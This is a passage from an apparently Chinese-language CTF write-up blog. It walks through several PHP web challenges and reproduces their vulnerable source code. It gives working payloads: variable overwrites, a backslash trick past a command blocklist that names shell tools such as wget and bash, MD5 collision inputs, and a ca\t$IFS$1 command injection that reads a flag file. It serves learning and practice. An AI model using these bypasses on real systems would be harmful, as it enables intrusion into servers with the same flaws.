</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>  ;  <span class="comment">//post 声明至当前文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　 </span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GET型变量重新赋值为当前文件变量中以其值为键名的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;　 <span class="comment">//传入的变量为flag   value不是flag</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;   </span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>exit 输出一条消息，并退出当前脚本</strong></p><p><img src="../images/image-20230407204057358.png" alt="image-20230407204057358"></p><p>我们进行代码审计 在这关我们绕过三个 if 函数 直接echo 明显不现实 所以突破点就是那三个 exit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上面我们要想绕过 需要</span><br><span class="line"></span><br><span class="line">get中参数必须含有 $ x 同时$ x不能含有flag</span><br><span class="line">存在get参数 或者 存在post参数</span><br><span class="line">post参数恒等于  flag 或者 get参数恒等于 falg</span><br><span class="line">当我们到达最后的时候fal也被重置了</span><br></pre></td></tr></table></figure><p>可变变量：如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量之前再多加一个 $ 符号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;bb&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>; </span><br><span class="line"><span class="comment">// 输出 bb   1.找到 $a,解析结果：b    2.找到$b,解析结果 bb</span></span><br></pre></td></tr></table></figure><p>本关的核心代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　　</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>  ;  <span class="comment">//post 声明至当前文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> x =&gt; <span class="variable">$y</span>)&#123;　　　 </span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GET型变量重新赋值为当前文件变量中以其值为键名的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以利用 foreach 进行变量重覆盖</p><p>在这一关可以执行输出内容地方有两个函数 exit 和 echo</p><p>第一个 exit（最后讲）</p><p><strong>第二个 exit——覆盖 yds</strong><br>我们的思路就是让flag变量覆盖到yds上，在执行exit($yds);<br>的时候输出flag</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　 </span><br><span class="line">   <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GET型变量重新赋值为当前文件变量中以其值&gt;为键名的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他输出<code>$yds</code>。我们只需让<code>$yds=$flag</code>就好了<br>由于我们输入的变量是yds=flag<br>所以<code>$x</code>=yds <code>$y</code>=flag<br><code>$$x</code>= <code>$$y</code> 所以 <code>$yds=$flag</code><br>flag变量就是 我们要的东西<br>exit($yds)。就是echo $flag。</p><p><strong>第三个——覆盖 is</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>前半段和前面的方法原理相同，让flag覆盖is<br>后面的<code>flag=flag</code>—&gt;<code>$flag</code>=<code>$flag</code> 目的是为了符合第三个if需求：<code>（$_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;)</code><br>进而输出 flag</p><p><strong>第一个——覆盖handsome</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=x&amp;x=flag</span><br></pre></td></tr></table></figure><p>handsome=flag不用说 就是让<code>$handsome</code>=<code>$flag</code><br>后面的目的就是让我们传入的变量是 flag 值不是flag 进而能够exit handsome</p><blockquote><p>这里的值表面是 x 但前面我们进行了变量覆盖使得 x=flag 所以在这里我们输出x的值就是flag的值</p></blockquote><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>题目</p><p><img src="../images/image-20230407205459073.png" alt="image-20230407205459073"></p><p>发现他的url有点猫腻</p><p><img src="../images/image-20230407205741174.png" alt="image-20230407205741174"></p><p>一个img一个cmd</p><p>把img里面的东西进行解码查看一下</p><p><img src="../images/image-20230407205834321.png" alt="image-20230407205834321"></p><p>经过两次base64和一次16进制解码得到   那么我们可以尝试一下进行index.php的查看   逆着编码就行了</p><p>查看源码，并进行base64解码得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>通过源码解读，可以发现file参数的作用应该就是用来读这个源码的，下面应该用不到他了，现在主要就是传cmd参数和post的a和b。</p><p>首先是cmd参数的过滤问题，他过滤了我所知道的所有能查看文件的命令，所以这个地方能绕过就更好了，实际上这的确是可以绕过的。</p><p>能绕过的关键就出在反斜杠上，上测试结果就知道了。</p><p><strong>本地测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传参的内容及结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls</span><br><span class="line">forbid ~</span><br><span class="line"></span><br><span class="line">?cmd=l\s</span><br><span class="line">l\s</span><br><span class="line"></span><br><span class="line">?cmd=\</span><br><span class="line">\</span><br></pre></td></tr></table></figure><p>对反斜杠不进行禁止，在linux中反斜杠也不影响命令的执行</p><p><img src="../images/image-20230407210831767.png" alt="image-20230407210831767"></p><p>这样，前面的反斜杠可以绕过检测，后面反斜杠还不影响命令的正常执行，那这不就等于过滤了个寂寞嘛。</p><p>过了preg_match的检测，最后一步就是过md5的强碰撞了，也就是本题的核心。</p><p>之前做的md5的题也用了md5的强碰撞（准确来讲应该叫强比较），当时是用传数组的方法通过检测的，而现在不可以这样做了，因为他多了一步强转的操作，这步操作就会使数组失效，所以得找工具或者找别人提供的可以进行md5强碰撞的内容来测试了。</p><p>这里找到两种版本，用谁都一样（仔细观察可以发现他两是一样的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>这里得需要用burpsuit来传参</p><p><img src="../images/image-20230407211239049.png" alt="image-20230407211239049"></p><p>成功拿到flag</p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>题目</p><p> <img src="../images/image-20230407211403556.png" alt="image-20230407211403556"></p><p>扫目录发现robots.txt文件</p><p><img src="../images/image-20230407211447353.png" alt="image-20230407211447353"></p><p>发现有个php文件</p><p><img src="../images/image-20230407211509028.png" alt="image-20230407211509028"></p><p>和名字是一样的，是一个假的flag</p><p>然后对这个页面进行抓包查看一下</p><p><img src="../images/image-20230407211626979.png" alt="image-20230407211626979"></p><p>发现回应头有个文件</p><p><img src="../images/image-20230407211709477.png" alt="image-20230407211709477"></p><p>读到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是绕过if判断</p><p><strong>level1</strong></p><p>进行分析level 1发现是intval函数，此函数在处理数据时会在接触到字符串时停止，因此如果输入100e2之类的数据，会解释称100，但后面在执行+1时，100e2是解释称10000的，因此此处使用100e2绕过</p><p><strong>level2</strong></p><p>进行分析level 2发现是md5的弱类型比较，==在比较数据的时候会进行类型的转换，因此只需要查找这种数据就行，此处采用：0e215962017，结果如下：</p><p>类型转化后两个都为0,所以相等</p><p><strong>level3</strong></p><p><img src="../images/image-20230407212708516.png" alt="image-20230407212708516"></p><p><strong>strstr</strong>    的意思 </p><p><img src="../images/image-20230407212749188.png" alt="image-20230407212749188"></p><p>第三处过滤，对cat和空格进行过滤，因此先采用ls或dir来获取目录信息</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fl4g.php?num=<span class="number">100e2</span>&amp;md5=<span class="number">0e215962017</span>&amp;get_flag=ca\t$IFS$<span class="number">1</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>题目</p><p><a href="https://www.hetianlab.com/specialized/20211217155625">以Twig模板为例浅学一手SSTI</a></p><p><img src="../images/image-20230407213346332.png" alt="image-20230407213346332"></p><p>在flag页面进行尝试的时候发现，这个模板是     Twig 模板引擎</p><p>也就是说是考查ssti的</p><p>尝试RCE ,发现似乎会检测输入的内容</p><p><img src="../images/image-20230407213639935.png" alt="image-20230407213639935"></p><p>题目提示是cookie,那我们就去cookie处看看</p><p><img src="../images/image-20230407213815921.png" alt="image-20230407213815921"></p><p>那我们就尝试在user处进行RCE</p><p><img src="../images/image-20230407214049562.png" alt="image-20230407214049562"></p><p>拿到flag</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>题目</p><p><img src="../images/image-20230407214558920.png" alt="image-20230407214558920"></p><p>给了一个提示，说是网站源码</p><p>下载下来查看</p><p>足足有36万行代码</p><p>所以我们就得写个脚本来查看一下哪些是有用的了</p><p>这道题就是考察脚本的编写能力</p><p><a href="https://www.wangan.com/docs/268">大佬写的wp</a></p><p>看大佬写的就行了</p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>题目</p><p><img src="../images/image-20230407215924361.png" alt="image-20230407215924361"></p><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span 